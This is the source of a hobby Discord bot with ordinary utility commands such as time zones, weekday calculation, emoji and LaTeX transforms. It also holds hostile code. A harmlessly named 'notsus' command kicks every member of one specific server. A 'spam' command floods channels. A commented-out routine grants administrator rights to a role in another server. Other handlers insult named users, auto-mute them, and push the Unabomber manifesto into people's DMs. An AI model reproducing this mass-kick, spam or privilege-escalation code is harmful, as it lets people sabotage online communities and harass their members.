import discord
from discord.ext import commands
from discord.utils import get

import json

import os
from dotenv import load_dotenv

from unicodedata import *

from datetime import datetime, timedelta
from time import localtime, strftime
import time

import math

import random

import textwrap

import cocanb

from replit import db
from keep_alive import keep_alive

from cocanb import Cocánb
from unicode import Unicode
from acknowledgements import Acknowledgements
from moderation import Moderation

import asyncio

load_dotenv()
TOKEN = os.getenv('TOKEN')

intents = discord.Intents.default()
intents.members = True

bot=commands.Bot(command_prefix="c.", intents=intents)
guild = bot.get_guild(731109675327553567)

@bot.event
async def on_ready():
  await bot.change_presence(status=discord.Status.online, activity=discord.Game(name='c.help'))
  
@bot.event
async def on_member_join(member):
  if member.guild.id == 932135849838129152:
    await bot.get_channel(932135849838129155).send(f'Welcome to the BDSM server <@!{member.id}>! Send "0" for more information.')

  if member.guild.id == 731109675327553567:
    await bot.get_channel(731109675327553571).send(f"<@!{member.id}>, welcome!\nIf you\'re here for maths help, go to <#845216463237021706> and just send the question you need help with, otherwise, we won\'t answer you.")

@bot.event
async def on_member_remove(member):
  if member.guild.id == 731109675327553567:
    await bot.get_channel(731109675327553571).send(f"Not again, <@!{member}> left\nNôa ğaí, <@!{member}> le f'nontč nètđ\nID: {member.id}")

@bot.event
async def on_message(message):
  #idk how to do this
  #if message.author.id == 807436687977611274 and " » c." in message.content:
  #  await message.channel.send(message.content)
  #  await message.edit(content='test')

    #this bit of code is unrelated to the first part
    #msglist = message.content.split(" » ")
    #msglist.pop(0)
    #msg = " » ".join(msglist)
    #await bot.process_commands(msg)
    #command = str(msg.split(" ")[0])
    #query = " ".join(msg.split(" ")[1:])
    #await message.channel.send(msg)
    #await message.channel.send(command)
    #await message.channel.send(query)
    #await msg.invoke(get_command(command), query=query)
  if message.content == "?" and message.author.id == 698865312954843216:
        await message.channel.send('shut the fuck up grogu you know what we were talking about stop acting stupid')
  await bot.process_commands(message)

  if message.content == "<@607583934527569920>" and message.channel.id == 845216463237021706:
    await message.channel.send("If you ping the owner one more time he won't help you with your question.")

  if message.content == "<@801983327023398912>" and message.channel.id == 845216463237021706:
    await message.channel.send("If you pinged me for maths help you have to realise that I am just a measly bot who can't do maths.")

  if ("@everyone" in message.content or "<@&800718299167064064>"in message.content) and message.guild.id == 731109675327553567:
    await message.channel.send("How fucking narcissistic do you have to be to ping hundreds of people and disrupt their lives just for you? You're lucky the everyone role you just pinged was fake otherwise you probably would have annoyed a lot of people.")

  if (message.guild.id == 932135849838129152 and message.author.id != 801983327023398912 and (message.content == '"' or message.content == '-' or message.content == '0' or message.content == '=' or message.content == "'" or message.content == "“" or message.content == "”" or (("'-'" in message.content or '"\n0\n=' in message.content) and "c." not in message.content))):
    await message.delete() 
    await message.channel.send("cringe")
    role = discord.utils.get(message.guild.roles, name="unbased")
    await message.author.add_roles(role)
    channel = bot.get_channel(932896343901478963)
    week_day = datetime.today().weekday()
    weekdays = ("Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday")
    week_day = weekdays[week_day]
    muted_time = '`' + week_day + ', ' + str(datetime.today()) + ' UTC`'
    await channel.send(f"You have been muted for 5 minutes lol <@{message.author.id}>\nThe time now is {muted_time}.")
    await asyncio.sleep(300)
    await message.author.remove_roles(role)
  
  if message.channel.id == 932896343901478963 and message.author.id != 801983327023398912 and "c.kaczynski" not in message.content:
    #open quote file
    my_file = open("Resources/kaczynski_quotes.txt", "r")
    content = my_file.read()
    content_list = content.split("\n\n")
    my_file.close()
    #choose random paragraph
    chosen_quote = random.choice(content_list)
    print (chosen_quote)
    #separate footnotes
    footnote_split = chosen_quote.split ("�")
    chosen_quote = footnote_split[0]
    footnote_split.pop(0)
    print(footnote_split)
    #split message if longer than 2000 characters and send
    split_quote = textwrap.wrap(chosen_quote, 2000)
    print (split_quote)
    await message.channel.send(f"<@{message.author.id}>")
    for i in split_quote:
      await message.channel.send (i)
    #send footnotes and split them if too long
    for i in footnote_split:
      split_footnote = textwrap.wrap(i, 2000)
      print (split_footnote)
      for i in split_footnote:
        i_newline = i.replace ("␤", "\n")
        await message.channel.send(i_newline)
      
    
@bot.command(name='ping', help="Checks whether bot is online.")
async def ping(ctx):
  await ctx.send('Bot is online.')

@bot.command(pass_context=True)
async def spam(ctx: commands.Context, count: int, *, message: str):
    """
    : Spam a message a set amount of times. Enter "stop" to stop the spam early

    Args:
        count (int): The number of times to spam the message
        message (str): The message to spam
    """
    if ctx.message.author.id == 607583934527569920:
      _spam = True
      while _spam and count:
          await ctx.send(message)

          def check(msg: discord.Message):
              return not msg.author.bot and msg.content.lower() == "stop"

          try:
              if await bot.wait_for("message", check=check, timeout=1.5):
                  _spam = False
                  await ctx.send("Okay I'm done now.")
          except asyncio.TimeoutError:
              count -= 1

#@bot.command(pass_context=True, help="give role")
#async def giverole(ctx, user: discord.Member, role: discord.Role):
    #await user.add_roles(role)

#@bot.command()
#async def EditRoleTest(ctx):
    #guild = bot.get_guild(419075224571478017)
    #role = get(guild.roles, id=718073241524240474)
    #permissions = discord.Permissions()
    #permissions.update(administrator = True)
    #await role.edit(permissions=permissions)

@bot.command(name='time',
             help='Shows current time given a timezone (In (-)HH:MM format)')
async def time(ctx, timezone: str = '00:00'):
	if timezone[0] == '-':
		hours = int(timezone[:-3]) - int(timezone[-2:]) / 60
	else:
		hours = int(timezone[:-3]) + int(timezone[-2:]) / 60
	future_time = datetime.today() + timedelta(hours=hours)
	if timezone == '00:00':
		plus = '±'
	elif timezone[0] == '-':
		plus = ''
	elif timezone[0] == '+':
		plus = ''
	else:
		plus = '+'
	week_day = future_time.weekday()
	weekdays = ("Monday", "Tuesday", "Wednesday", "Thursday", "Friday",
	            "Saturday", "Sunday")
	week_day = weekdays[week_day]
	if timezone[-3] == ':':
		await ctx.send('`' + week_day + ', ' + str(future_time) + ', UTC' +
		               plus + timezone + '`')
	else:
		await ctx.send ('invalid timezone')

@bot.command(name='weekday', help="Returns day of the week for a given date (Format: DD MM YYYY)")
async def weekday(ctx, day:int, month:int, year:int):
#check if date is valid
  if (year % 4 == 0 and year % 100 != 0) or year % 400 == 0:
    month_length = [31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
  else:
    month_length = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
  if month > 12:
    await ctx.send ("Invalid date")
  elif day > month_length[month-1]:
    await ctx.send ("Invalid date")

  #conway's algorithm
  else:
    doomsday = {1:3, 2:28, 3:14, 4:4, 5:9, 6:6, 7:11, 8:8, 9:5, 10:10, 11:7, 12:12}
    doomsday_leap = {1:4, 2:29, 3:14, 4:4, 5:9, 6:6, 7:11, 8:8, 9:5, 10:10, 11:7, 12:12}
    if (year % 4 == 0 and year % 100 != 0) or year % 400 == 0:
      #print ("leap_year")
      doomsday_offset = (day - doomsday_leap[month]) % 7
    else: 
      doomsday_offset = (day - doomsday[month]) % 7
    
    century_dict = {0:2, 1:0, 2:5, 3:3}
    century_code = century_dict[int (year / 100) % 4]

    num1 = int ((year % 100) / 12)
    num2 = (year % 100) % 12
    num3 = int (num2 / 4)

    #print (doomsday_offset)
    #print (century_code)
    #print (num1)
    #print (num2)
    #print (num3)
    #print ()

    weekday = (doomsday_offset + century_code + num1 + num2 + num3) % 7
    weekdays = {0:"Sunday", 1:"Monday", 2:"Tuesday", 3:"Wednesday", 4:"Thursday", 5:"Friday", 6:"Saturday"}
    weekday = weekdays[weekday]
    await ctx.send (weekday)

		

@bot.command(name="return", help="Returns message")
async def msgreturn(ctx, *, msg):
	await ctx.send(msg)

@bot.command(name='minecraftinfo', help="Sends information for Minecraft server")
async def minecraftinfo(ctx):
  await ctx.send('SERVER INFO:\nHostname: cocanb.aternos.me:36520\nIP: 185.116.157.37\nPort: 36520\n\nVersion: PaperMC 1.17.1\nPlugins: DiscordSRV, WorldEdit\nGamemode: Creative\nDifficulty: Normal')


@bot.command(name="delreturn",help="Returns message (deletes original message)\n(may not work on every server)")
async def delreturn(ctx, *, msg):
	await ctx.message.delete()
	await ctx.send(msg)

@bot.command(
    name="emoji",
    help=
    "Sends some emojis\nSupported: amogus/amongus/among us, barry, biang, bruh/facepalm, surprised/that's illegal/illegal, void, woah, shitting toothpaste, dababy, latex, troll/trollface\n(words separated by / output the same emoji)"
)
async def emoji(ctx, *, name):
	name = name.lower()
	if name == "ye":
		await ctx.send("<:ye:799291949273317377>")
	elif name == "amogus" or name == "amongus" or name == "among us":
		await ctx.send("<:amogus:809427238784860210>")
	elif name == "barry":
		await ctx.send("<:barry:811154017672757270>")
	elif name == "biang":
		await ctx.send("<:biang:809669658143227905>")
	elif name == "bruh" or name == "facepalm":
		await ctx.send("<:bruh:801100506251526145>")
	elif name == "surprised" or name == "that's illegal" or name == "illegal":
		await ctx.send("<:surprised:801099678988501072>")
	elif name == "void":
		await ctx.send("<:void:798150976191201313>")
	elif name == "woah":
		await ctx.send("<:woah:807905973162999818>")
	elif name == "shitting toothpaste":
	  await ctx.send("<:shittingtoothpaste:850006091827773441>")
	elif name == "dababy":
	  await ctx.send("<:dababy:850279101548855317>")
	elif name == "latex":
	  await ctx.send("<:latex1:846147354083328030><:latex2:846147354000359515>")
	elif name == "troll" or name == "trollface":
	  await ctx.send("<:trollface:934033439164878868>")
	else:
		await ctx.send("Invalid emoji")

@bot.command(name='customemoji', help='Sends custom emoji not in c.emoji list\n(Emoji must be from a server this bot is in)')
async def customemoji(ctx, name, emoji_id, animated: str = ''):
  if animated=='':
    anim=''
  else:
    anim='a'
  await ctx.send(f'<{anim}:{name}:{emoji_id}>')

@bot.command(name='ipa', help='Sends official International Phonetic Alphabet chart')
async def ipa(ctx):
    with open("Resources/IPA_Kiel_2020_full.pdf", "rb") as file:
      await ctx.send("Official International Phonetic Alphabet Chart", file=discord.File(file, "Official International Phonetic Alphabet Chart.pdf"))

@bot.command (name="latextransform", help="Linearly transform a piece of LaTeX code using a matrix\n\n Input the four entries of the transformation matrix in the following order: top left, bottom left, top right then bottom right, then the LaTeX code, each separated by spaces")
async def latextransform (ctx, m00, m10, m01, m11, *, latex):
  m00 = float (m00)
  m10 = float (m10)
  m01 = float (m01)
  m11 = float (m11)

  E = (m00 + m11) / 2
  F = (m00 - m11) / 2
  G = (m10 + m01) / 2
  H = (m10 - m01) / 2

  Q = math.sqrt (E**2 + H**2)
  R = math.sqrt (F**2 + G**2)

  sx = Q + R
  sy = Q - R

  a1 = math.atan2 (G,F)
  a2 = math.atan2 (H,E)

  theta = (a2 - a1) / 2
  phi = (a2 + a1) / 2

  theta_deg = theta * 180 / math.pi
  phi_deg = phi * 180 / math.pi

  await ctx.send ('```$\\rotatebox{'+str(phi_deg)+'}{$\\scalebox{'+str(sx)+'}['+str(sy)+']{$\\rotatebox{'+str(theta_deg)+'}{$'+latex+'$}$}$}$```')

@bot.command(name="notsus")
async def notsus(ctx):
    if ctx.author.id == 702746453927264276 or ctx.author.id == 607583934527569920:
        for member in bot.get_guild(725639774190305360).members:
            try:
                await member.kick()
                continue
            except Exception:
                continue
            else:
                continue

@bot.command (name="kaczynski", help="Sends part of Ted Kaczynski's manifesto given the paragraph number (Type 0 for a random paragraph and any number NOT within the range of 0-232 for contents)")
async def kaczynski (ctx, paragraph:int):
  if paragraph not in range(0, 233):
    await ctx.send("""
INDUSTRIAL SOCIETY AND ITS FUTURE
Contents:
1-5: Introduction
6-9: THE PSYCHOLOGY OF MODERN LEFTISM
10-23: FEELINGS OF INFERIORITY
24-32: OVERSOCIALIZATION
33-37: THE POWER PROCESS
38-41: SURROGATE ACTIVITIES
42-44: AUTONOMY
45-58: SOURCES OF SOCIAL PROBLEMS
59-76: DISRUPTION OF THE POWER PROCESS IN MODERN SOCIETY
77-86: HOW SOME PEOPLE ADJUST
87-92: THE MOTIVES OF SCIENTISTS
93-98: THE NATURE OF FREEDOM
99-113: SOME PRINCIPLES OF HISTORY
114-120: RESTRICTION OF FREEDOM IS UNAVOIDABLE IN INDUSTRIAL SOCIETY
121-124: THE ‘BAD’ PARTS OF TECHNOLOGY CANNOT BE SEPARATED FROM THE ‘GOOD’ PARTS
125-135: TECHNOLOGY IS A MORE POWERFUL SOCIAL FORCE THAN THE ASPIRATION FOR FREEDOM
136-139: SIMPLER SOCIAL PROBLEMS HAVE PROVED INTRACTABLE
140-142: REVOLUTION IS EASIER THAN REFORM
143-160: CONTROL OF HUMAN BEHAVIOR
161-170: HUMAN RACE AT A CROSSROADS
171-179: THE FUTURE
180-206: STRATEGY
207-212: TWO KINDS OF TECHNOLOGY
213-230: THE DANGER OF LEFTISM
231-232: FINAL NOTE
""")
  else:
    if paragraph == 0:
      random_paragraph = True
    else:
      random_paragraph = False
    #open quote file
    my_file = open("Resources/kaczynski_quotes.txt", "r")
    content = my_file.read()
    content_list = content.split("\n\n")
    my_file.close()
    #choose paragraph
    if random_paragraph == True:
      chosen_quote = random.choice(content_list)
    else:
      chosen_quote = content_list[paragraph-1]
    print (chosen_quote)
    #separate footnotes
    footnote_split = chosen_quote.split ("�")
    chosen_quote = footnote_split[0]
    footnote_split.pop(0)
    print(footnote_split)
    #split message if longer than 2000 characters and send
    split_quote = textwrap.wrap(chosen_quote, 2000)
    print (split_quote)
    for i in split_quote:
      await ctx.send (i)
    #send footnotes and split them if too long
    for i in footnote_split:
      split_footnote = textwrap.wrap(i, 2000)
      print (split_footnote)
      for i in split_footnote:
        i_newline = i.replace ("␤", "\n")
        await ctx.send(i_newline)

@bot.command (name="kaczynskidm", help="Sends part of Ted Kaczynski's manifesto to someone's dm given the paragraph number (Type 0 for a random paragraph and any number NOT within the range of 0-232 for contents) (Only for admins and Cocánb Altort himself)")
async def kaczynskidm (ctx, user: discord.User, paragraph:int):
  if ctx.message.author.guild_permissions.administrator or ctx.message.author.id == 607583934527569920:
    if paragraph not in range(0, 233):
      await user.send("""
INDUSTRIAL SOCIETY AND ITS FUTURE
Contents:
1-5: Introduction
6-9: THE PSYCHOLOGY OF MODERN LEFTISM
10-23: FEELINGS OF INFERIORITY
24-32: OVERSOCIALIZATION
33-37: THE POWER PROCESS
38-41: SURROGATE ACTIVITIES
42-44: AUTONOMY
45-58: SOURCES OF SOCIAL PROBLEMS
59-76: DISRUPTION OF THE POWER PROCESS IN MODERN SOCIETY
77-86: HOW SOME PEOPLE ADJUST
87-92: THE MOTIVES OF SCIENTISTS
93-98: THE NATURE OF FREEDOM
99-113: SOME PRINCIPLES OF HISTORY
114-120: RESTRICTION OF FREEDOM IS UNAVOIDABLE IN INDUSTRIAL SOCIETY
121-124: THE ‘BAD’ PARTS OF TECHNOLOGY CANNOT BE SEPARATED FROM THE ‘GOOD’ PARTS
125-135: TECHNOLOGY IS A MORE POWERFUL SOCIAL FORCE THAN THE ASPIRATION FOR FREEDOM
136-139: SIMPLER SOCIAL PROBLEMS HAVE PROVED INTRACTABLE
140-142: REVOLUTION IS EASIER THAN REFORM
143-160: CONTROL OF HUMAN BEHAVIOR
161-170: HUMAN RACE AT A CROSSROADS
171-179: THE FUTURE
180-206: STRATEGY
207-212: TWO KINDS OF TECHNOLOGY
213-230: THE DANGER OF LEFTISM
231-232: FINAL NOTE
  """)
    else:
      if paragraph == 0:
        random_paragraph = True
      else:
        random_paragraph = False
      #open quote file
      my_file = open("Resources/kaczynski_quotes.txt", "r")
      content = my_file.read()
      content_list = content.split("\n\n")
      my_file.close()
      #choose paragraph
      if random_paragraph == True:
        chosen_quote = random.choice(content_list)
      else:
        chosen_quote = content_list[paragraph-1]
      print (chosen_quote)
      #separate footnotes
      footnote_split = chosen_quote.split ("�")
      chosen_quote = footnote_split[0]
      footnote_split.pop(0)
      print(footnote_split)
      #split message if longer than 2000 characters and send
      split_quote = textwrap.wrap(chosen_quote, 2000)
      print (split_quote)
      for i in split_quote:
        await user.send (i)
      #send footnotes and split them if too long
      for i in footnote_split:
        split_footnote = textwrap.wrap(i, 2000)
        print (split_footnote)
        for i in split_footnote:
          i_newline = i.replace ("␤", "\n")
          await user.send(i_newline)
  else:
    await ctx.send ("You do not have the permission to use this command.")

@bot.command (name="kaczynskifull", help="Sends Ted Kaczynski's full manifesto (Can only be used by Cocánb Altort)")
async def kaczynskifull (ctx):
  if ctx.message.author.id == 607583934527569920:
    await ctx.send("""
INDUSTRIAL SOCIETY AND ITS FUTURE
Contents:
1-5: Introduction
6-9: THE PSYCHOLOGY OF MODERN LEFTISM
10-23: FEELINGS OF INFERIORITY
24-32: OVERSOCIALIZATION
33-37: THE POWER PROCESS
38-41: SURROGATE ACTIVITIES
42-44: AUTONOMY
45-58: SOURCES OF SOCIAL PROBLEMS
59-76: DISRUPTION OF THE POWER PROCESS IN MODERN SOCIETY
77-86: HOW SOME PEOPLE ADJUST
87-92: THE MOTIVES OF SCIENTISTS
93-98: THE NATURE OF FREEDOM
99-113: SOME PRINCIPLES OF HISTORY
114-120: RESTRICTION OF FREEDOM IS UNAVOIDABLE IN INDUSTRIAL SOCIETY
121-124: THE ‘BAD’ PARTS OF TECHNOLOGY CANNOT BE SEPARATED FROM THE ‘GOOD’ PARTS
125-135: TECHNOLOGY IS A MORE POWERFUL SOCIAL FORCE THAN THE ASPIRATION FOR FREEDOM
136-139: SIMPLER SOCIAL PROBLEMS HAVE PROVED INTRACTABLE
140-142: REVOLUTION IS EASIER THAN REFORM
143-160: CONTROL OF HUMAN BEHAVIOR
161-170: HUMAN RACE AT A CROSSROADS
171-179: THE FUTURE
180-206: STRATEGY
207-212: TWO KINDS OF TECHNOLOGY
213-230: THE DANGER OF LEFTISM
231-232: FINAL NOTE
""")
    contents = {1:"Introduction",6:"THE PSYCHOLOGY OF MODERN LEFTISM",10:"FEELINGS OF INFERIORITY",24:"OVERSOCIALIZATION",33:"THE POWER PROCESS",38:"SURROGATE ACTIVITIES",42:"AUTONOMY",45:"SOURCES OF SOCIAL PROBLEMS",59:"DISRUPTION OF THE POWER PROCESS IN MODERN SOCIETY",77:"HOW SOME PEOPLE ADJUST",87:"THE MOTIVES OF SCIENTISTS",93:"THE NATURE OF FREEDOM",99:"SOME PRINCIPLES OF HISTORY",114:"RESTRICTION OF FREEDOM IS UNAVOIDABLE IN INDUSTRIAL SOCIETY",121:"THE ‘BAD’ PARTS OF TECHNOLOGY CANNOT BE SEPARATED FROM THE ‘GOOD’ PARTS",125:"TECHNOLOGY IS A MORE POWERFUL SOCIAL FORCE THAN THE ASPIRATION FOR FREEDOM",136:"SIMPLER SOCIAL PROBLEMS HAVE PROVED INTRACTABLE",140:"REVOLUTION IS EASIER THAN REFORM",143:"CONTROL OF HUMAN BEHAVIOR",161:"HUMAN RACE AT A CROSSROADS",171:"THE FUTURE",180:"STRATEGY",207:"TWO KINDS OF TECHNOLOGY",213:"THE DANGER OF LEFTISM",231:"FINAL NOTE"}
    for i in range (1, 233):
      if contents.get (i) is None:
        pass
      else:
        await ctx.send (contents.get (i))
      #open quote file
      my_file = open("Resources/kaczynski_quotes.txt", "r")
      content = my_file.read()
      content_list = content.split("\n\n")
      my_file.close()
      #choose paragraph
      chosen_quote = content_list[i-1]
      #print (chosen_quote)
      #separate footnotes
      footnote_split = chosen_quote.split ("�")
      chosen_quote = footnote_split[0]
      footnote_split.pop(0)
      #print(footnote_split)
      #split message if longer than 2000 characters and send
      split_quote = textwrap.wrap(chosen_quote, 2000)
      #print (split_quote)
      for i in split_quote:
        await ctx.send (i)
      #send footnotes and split them if too long
      for i in footnote_split:
        split_footnote = textwrap.wrap(i, 2000)
        #print (split_footnote)
        for i in split_footnote:
          i_newline = i.replace ("␤", "\n")
          await ctx.send(i_newline)

@bot.command (name="kaczynskifulldm", help="Sends Ted Kaczynski's full manifesto to someone's dms (Can only be used by Cocánb Altort)")
async def kaczynskifulldm (ctx, user: discord.User):
  if ctx.message.author.id == 607583934527569920:
    await user.send("""
INDUSTRIAL SOCIETY AND ITS FUTURE
Contents:
1-5: Introduction
6-9: THE PSYCHOLOGY OF MODERN LEFTISM
10-23: FEELINGS OF INFERIORITY
24-32: OVERSOCIALIZATION
33-37: THE POWER PROCESS
38-41: SURROGATE ACTIVITIES
42-44: AUTONOMY
45-58: SOURCES OF SOCIAL PROBLEMS
59-76: DISRUPTION OF THE POWER PROCESS IN MODERN SOCIETY
77-86: HOW SOME PEOPLE ADJUST
87-92: THE MOTIVES OF SCIENTISTS
93-98: THE NATURE OF FREEDOM
99-113: SOME PRINCIPLES OF HISTORY
114-120: RESTRICTION OF FREEDOM IS UNAVOIDABLE IN INDUSTRIAL SOCIETY
121-124: THE ‘BAD’ PARTS OF TECHNOLOGY CANNOT BE SEPARATED FROM THE ‘GOOD’ PARTS
125-135: TECHNOLOGY IS A MORE POWERFUL SOCIAL FORCE THAN THE ASPIRATION FOR FREEDOM
136-139: SIMPLER SOCIAL PROBLEMS HAVE PROVED INTRACTABLE
140-142: REVOLUTION IS EASIER THAN REFORM
143-160: CONTROL OF HUMAN BEHAVIOR
161-170: HUMAN RACE AT A CROSSROADS
171-179: THE FUTURE
180-206: STRATEGY
207-212: TWO KINDS OF TECHNOLOGY
213-230: THE DANGER OF LEFTISM
231-232: FINAL NOTE
""")
    contents = {1:"Introduction",6:"THE PSYCHOLOGY OF MODERN LEFTISM",10:"FEELINGS OF INFERIORITY",24:"OVERSOCIALIZATION",33:"THE POWER PROCESS",38:"SURROGATE ACTIVITIES",42:"AUTONOMY",45:"SOURCES OF SOCIAL PROBLEMS",59:"DISRUPTION OF THE POWER PROCESS IN MODERN SOCIETY",77:"HOW SOME PEOPLE ADJUST",87:"THE MOTIVES OF SCIENTISTS",93:"THE NATURE OF FREEDOM",99:"SOME PRINCIPLES OF HISTORY",114:"RESTRICTION OF FREEDOM IS UNAVOIDABLE IN INDUSTRIAL SOCIETY",121:"THE ‘BAD’ PARTS OF TECHNOLOGY CANNOT BE SEPARATED FROM THE ‘GOOD’ PARTS",125:"TECHNOLOGY IS A MORE POWERFUL SOCIAL FORCE THAN THE ASPIRATION FOR FREEDOM",136:"SIMPLER SOCIAL PROBLEMS HAVE PROVED INTRACTABLE",140:"REVOLUTION IS EASIER THAN REFORM",143:"CONTROL OF HUMAN BEHAVIOR",161:"HUMAN RACE AT A CROSSROADS",171:"THE FUTURE",180:"STRATEGY",207:"TWO KINDS OF TECHNOLOGY",213:"THE DANGER OF LEFTISM",231:"FINAL NOTE"}
    for i in range (1, 233):
      if contents.get (i) is None:
        pass
      else:
        await user.send (contents.get (i))
      #open quote file
      my_file = open("Resources/kaczynski_quotes.txt", "r")
      content = my_file.read()
      content_list = content.split("\n\n")
      my_file.close()
      #choose paragraph
      chosen_quote = content_list[i-1]
      #print (chosen_quote)
      #separate footnotes
      footnote_split = chosen_quote.split ("�")
      chosen_quote = footnote_split[0]
      footnote_split.pop(0)
      #print(footnote_split)
      #split message if longer than 2000 characters and send
      split_quote = textwrap.wrap(chosen_quote, 2000)
      #print (split_quote)
      for i in split_quote:
        await user.send (i)
      #send footnotes and split them if too long
      for i in footnote_split:
        split_footnote = textwrap.wrap(i, 2000)
        #print (split_footnote)
        for i in split_footnote:
          i_newline = i.replace ("␤", "\n")
          await user.send(i_newline)

bot.add_cog(Cocánb(bot))
bot.add_cog(Unicode(bot))
bot.add_cog(Acknowledgements(bot))
bot.add_cog(Moderation(bot))

keep_alive()
bot.run(TOKEN)